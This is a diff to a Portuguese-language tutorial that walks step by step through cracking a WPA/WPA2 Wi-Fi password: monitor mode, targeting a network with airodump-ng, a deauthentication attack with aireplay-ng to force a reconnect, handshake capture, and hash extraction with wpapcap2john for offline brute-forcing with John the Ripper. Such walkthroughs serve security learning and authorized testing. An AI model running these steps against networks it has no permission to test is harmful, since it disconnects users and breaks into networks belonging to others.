@@ -18,7 +18,7 @@ ________________________________________________________________________________
 ```
 $ iw list   
 ``` 
-###### Aparecera várias informações sobre a interface, caso suporte os modos, na saida do comando procure algo assim:	
+###### Aparecera várias informações sobre a interface, na saida do comando procure por isso:	
 
 ```
 Supported interface modes:
@@ -76,8 +76,8 @@ phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 ```    
     
-##### $ ifconfig ou $ iwconfig para confirmar que a interface esta em monitor-mode
-##### Se a interface estiver em monitor-mode voc verá algo assim:
+##### $ iwconfig para confirmar que a interface esta em monitor-mode
+##### Se a interface estiver em monitor-mode voc verá isso:
 ##### (repare em Mode:Monitor)
 ```
  ath0      IEEE 802.11g  ESSID:""  
@@ -129,7 +129,7 @@ $ sudo airodump-ng <interface>
  
 _________________________________________________________________________________________________________________________________________________________
  # Quarto passo
- ##### Depois de identificar o alvo, comece a captura dos pacotes da rede alvo para então capturar o HANDSHAKE
+ ##### Depois de identificar o alvo, comece a captura dos pacotes da rede alvo:
  ```
  $ sudo airodump-ng --bssid <macaddr> -c <canal> -w <arquivo> <interface>
  ```
@@ -144,9 +144,9 @@ ________________________________________________________________________________
 
 _________________________________________________________________________________________________________________________________________________________ 
  # Quinto passo
- ##### Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP, para ele ser desconectado. Em seguida o dispositivo irá se conectar de novo automaticamente (ou manualmente por alguém). E é nessa hora que o HANDSHAKE é capturado...
+ ##### Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP. Em seguida o dispositivo irá se conectar de novo automaticamente (ou manualmente por uma pessoa). E nessa hora o HANDSHAKE é capturado...
  
- ##### Para desautenticar uma STATION de um AP sera usado o aireplay-ng:
+ ##### Para desautenticar uma STATION de um AP sera use o aireplay-ng:
  ```
  $ aireplay-ng -0 1 -a <macAP> -c <macSTATION> <interface>
  ```
@@ -169,7 +169,7 @@ ________________________________________________________________________________
  
 _________________________________________________________________________________________________________________________________________________________
  # Sexto passo
- ##### Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando os pacotes irá aparecer o seguinte [ WPA handshake: 00:14:6C:7E:40:80
+ ##### Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando o trafego da rede alvo aparecera a confirmação de que o handshake foi pego [ WPA handshake: 00:14:6C:7E:40:80
  Exemplo:
  ```
 	 CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80
@@ -181,16 +181,16 @@ ________________________________________________________________________________
           00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy       
  ```
  
- ##### Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual, vera alguns arquivos incluindo a captura do trafego( arquivo.cap)
+ ##### Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual, vera alguns arquivos incluindo um arquivo arquivo.cap .
  
- ##### E depois da captura ser feita, você pode colocar a interface de volta em modo Managed (se necessario)
+ ##### E depois da captura ser feita, você pode colocar a interface de volta em modo Managed
  
  ```
  $ sudo airmon-ng stop <interface>  # para o modo monitor
  
  $ service network-manager start  # reinicia o gerenciador de rede
  ```
- ($ ifconfig ou $ iwconfig para confirmar o modo que a interface esta)
+ ($ iwconfig para confirmar o modo que a interface esta)
  
  
  
@@ -206,7 +206,7 @@ ________________________________________________________________________________
  ##### mais  informações aqui: (https://community.cisco.com/t5/wireless-mobility-knowledge-base/802-11-sniffer-capture-analysis-wpa-wpa2-with-psk-or-eap/ta-p/3116990)
  
  
- ##### Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa. Uma delas é com uma ferramenta WPAPCAP2JOHN do pacote John The Ripper.
+ ##### Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa. Uma delas é com uma ferramenta wpapcap2john do pacote John The Ripper.
  ```
  $ wpapcap2john -v arquivo.cap
  ```
@@ -214,9 +214,9 @@ ________________________________________________________________________________
  
  (colocar exemplo da saida do comando)
  
- ##### Se o handshake foi capturado corretamente a ferramenta wpapcap2john pode converter um hash da autenticação capturada no arquivo .cap, para ser feito um ataque de brute-force offline... com o seguinte comando:
+ ##### Se o handshake foi capturado corretamente a ferramenta pode extrair um hash da autenticação com seguinte comando:
  ```  
- $ wpapcap2john > <arquivo de saida> 
+ $ wpapcap2john arquivo.cap > <arquivo de saida> 
  ```
  ##### No arquivo ficara um hash parecido com isso: 
 ``` 
@@ -229,7 +229,6 @@ b9IE63q1mc:0ef770407b5f:f454201e4174:f454201e4174::WPA2, verified:arquivo.cap
 
 _________________________________________________________________________________________________________________________________________________________
 # Oitavo passo 
-##### (não pensei que teria tantos passos :) ) 
 
 ##### Com o hash em mãos é só fazer o brute-force (o exemplo será com John The Ripper porque a conversão do hash feito pela ferramenta wpapcap2john resulta em um formato de hash próprio para o JTR)
 ```
